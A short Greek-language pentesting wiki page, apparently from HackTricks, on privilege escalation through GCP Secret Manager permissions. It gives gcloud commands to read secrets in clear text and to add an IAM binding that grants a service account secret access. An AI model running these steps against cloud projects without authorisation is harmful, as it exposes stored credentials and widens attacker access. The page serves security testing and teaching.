# GCP - Secretmanager Privesc

{{#include ../../../banners/hacktricks-training.md}}

## secretmanager

Για περισσότερες πληροφορίες σχετικά με το secretmanager:

{{#ref}}
../gcp-services/gcp-secrets-manager-enum.md
{{#endref}}

### `secretmanager.versions.access`

Αυτό σας δίνει πρόσβαση να διαβάσετε τα secrets από τον secret manager και ίσως αυτό να βοηθήσει να escalate privielegs (ανάλογα με τις πληροφορίες που είναι αποθηκευμένες μέσα στο secret):

<details><summary>Λήψη clear-text έκδοσης του secret</summary>
```bash
# Get clear-text of version 1 of secret: "<secret name>"
gcloud secrets versions access 1 --secret="<secret_name>"
```
</details>

Εφόσον πρόκειται επίσης για τεχνική post exploitation, μπορεί να βρεθεί στο:

{{#ref}}
../gcp-post-exploitation/gcp-secretmanager-post-exploitation.md
{{#endref}}

### `secretmanager.secrets.setIamPolicy`

Αυτό σας δίνει πρόσβαση να διαβάσετε τα secrets από τον Secret Manager, για παράδειγμα χρησιμοποιώντας:

<details><summary>Προσθήκη IAM policy binding στο secret</summary>
```bash
gcloud secrets add-iam-policy-binding <scret-name> \
--member="serviceAccount:<sa-name>@$PROJECT_ID.iam.gserviceaccount.com" \
--role="roles/secretmanager.secretAccessor"
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
